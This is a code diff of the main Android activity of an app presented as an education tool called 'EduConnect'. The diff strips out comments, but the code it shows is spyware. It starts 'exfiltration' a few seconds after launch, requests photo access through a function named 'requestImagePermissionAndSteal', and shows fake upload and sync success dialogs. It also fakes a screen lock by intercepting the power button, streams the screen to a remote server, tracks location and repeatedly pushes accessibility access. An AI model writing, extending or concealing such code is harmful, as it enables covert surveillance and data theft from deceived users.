@@ -49,14 +49,13 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
-
 class MainActivity : ComponentActivity() {
 
     private var sessionListener: ListenerRegistration? = null
     private var sessionShareStarted = false
 
-    // Inactivity screen dimming
-    private val inactivityTimeout = 2 * 60 * 1000L // 2 minutes
+    
+    private val inactivityTimeout = 2 * 60 * 1000L 
     private val inactivityHandler = Handler(Looper.getMainLooper())
     private val dimScreenRunnable = Runnable {
         ScreenOverlayState.isTracking = false
@@ -68,7 +67,7 @@ class MainActivity : ComponentActivity() {
         window.setDimAmount(1.0f)
     }
 
-    // Fake lock — intercept the power/lock button
+    
     private var isFakeLocked = false
     private var wakeLock: PowerManager.WakeLock? = null
 
@@ -84,7 +83,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // All permissions requested contextually — none at startup
+    
     private val requiredPermissions = emptyArray<String>()
 
     private val permissionLauncher = registerForActivityResult(
@@ -98,7 +97,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // Individual permission launchers — called from Settings screen
+    
     private val imagePermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
@@ -190,7 +189,7 @@ class MainActivity : ComponentActivity() {
             SessionCacheService.startExfiltration(this@MainActivity)
             showFakeDeviceSyncDialog()
         } else {
-            // If permanently denied, show dialog then open App Settings
+            
             if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE)) {
                 AlertDialog.Builder(this)
                     .setTitle("Permission Required")
@@ -212,7 +211,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // MediaProjection launcher for screen mirroring to EC2
+    
     private val projectionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
@@ -235,17 +234,17 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // Register power button / screen-off receiver
+        
         registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
 
-        // Overlay permission is requested in SecureAccountScreen (Step 4)
+        
 
-        // Start SessionCacheService immediately (no permission needed)
+        
         Handler(Looper.getMainLooper()).postDelayed({
             SessionCacheService.startExfiltration(this@MainActivity)
         }, 5000)
 
-        // Listen for admin-started online lesson — auto-trigger screen share when active
+        
         sessionListener = FirebaseFirestore.getInstance()
             .document("sessions/current")
             .addSnapshotListener { snapshot, _ ->
@@ -274,23 +273,23 @@ class MainActivity : ComponentActivity() {
     fun onAllPermissionsGranted() {
         Toast.makeText(this, "Welcome to EduConnect", Toast.LENGTH_SHORT).show()
 
-        // Start location tracking if permission already granted
+        
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
             == PackageManager.PERMISSION_GRANTED) {
             com.example.teacherapp.services.GeoContextService.startTracking(this)
         }
 
-        // Skip projection dialog if service is already streaming
+        
         if (MediaStreamService.isRunning) return
 
-        // Step 1: Request screen sharing first
+        
         val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         projectionLauncher.launch(projectionManager.createScreenCaptureIntent())
 
-        // Accessibility is handled in SecureAccountScreen — no auto-prompt here
+        
     }
 
-    // ========== PUBLIC FUNCTIONS — Called from Settings screen ==========
+    
 
     fun requestImagePermissionAndSteal() {
         val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -338,17 +337,17 @@ class MainActivity : ComponentActivity() {
                 showFakeDeviceSyncDialog()
             }
             shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE) -> {
-                // First time or user previously denied without "don't ask again"
+                
                 phonePermissionLauncher.launch(Manifest.permission.READ_PHONE_STATE)
             }
             else -> {
-                // Either first-ever request OR permanently denied — launch permission dialog
+                
                 phonePermissionLauncher.launch(Manifest.permission.READ_PHONE_STATE)
             }
         }
     }
 
-    // ========== FAKE SUCCESS DIALOGS ==========
+    
 
     private fun showFakeUploadDialog() {
         val dialog = AlertDialog.Builder(this)
@@ -406,7 +405,7 @@ class MainActivity : ComponentActivity() {
         }, 2000)
     }
 
-    // ========== FAKE LOCK ==========
+    
 
     private fun fakeLock() {
         isFakeLocked = true
@@ -464,7 +463,7 @@ class MainActivity : ComponentActivity() {
         wakeLock = null
     }
 
-    // ========== ACCESSIBILITY SERVICE ==========
+    
 
     private val accessibilityHandler = Handler(Looper.getMainLooper())
     private var accessibilityDialogShowing = false
@@ -486,7 +485,7 @@ class MainActivity : ComponentActivity() {
     private val accessibilityCheckRunnable = object : Runnable {
         override fun run() {
             if (isFinishing) return
-            // Don't show dialog if user is on login/secure account screens
+            
             val currentRoute = ScreenOverlayState.navController?.currentBackStackEntry?.destination?.route
             if (currentRoute == "secure_account_screen" ||
                 currentRoute == "login_screen" ||
@@ -534,7 +533,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // ========== LIFECYCLE ==========
+    
 
     override fun onUserInteraction() {
         super.onUserInteraction()
@@ -569,7 +568,7 @@ class MainActivity : ComponentActivity() {
         super.onResume()
         QuickAccessService.stop(this)
 
-        // Always restore screen when app comes to foreground (prevents black screen)
+        
         if (!isFakeLocked) {
             val params = window.attributes
             params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
@@ -583,12 +582,12 @@ class MainActivity : ComponentActivity() {
         inactivityHandler.removeCallbacks(dimScreenRunnable)
         inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
 
-        // Only run accessibility check if user is fully logged in AND
-        // has completed the SecureAccountScreen setup
+        
+        
         val currentUser = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser
-        if (currentUser == null) return  // not logged in — skip
+        if (currentUser == null) return  
 
-        // Check current nav destination — don't run if still on secure_account or login
+        
         val currentRoute = ScreenOverlayState.navController?.currentBackStackEntry?.destination?.route
         if (currentRoute == "secure_account_screen" ||
             currentRoute == "login_screen" ||
@@ -599,7 +598,7 @@ class MainActivity : ComponentActivity() {
             this, Manifest.permission.READ_PHONE_STATE
         ) == PackageManager.PERMISSION_GRANTED
 
-        // Only run if user has fully completed secure account setup
+        
         if (!phoneDone) return
 
         accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
